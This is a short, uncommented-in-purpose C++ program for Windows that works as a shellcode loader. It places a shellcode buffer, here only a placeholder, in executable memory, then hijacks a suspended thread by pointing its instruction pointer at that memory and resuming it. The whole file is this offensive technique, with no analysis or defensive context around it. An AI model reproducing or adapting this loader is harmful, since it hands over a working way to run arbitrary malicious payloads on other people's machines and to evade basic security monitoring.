#include <Windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = "...";

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}
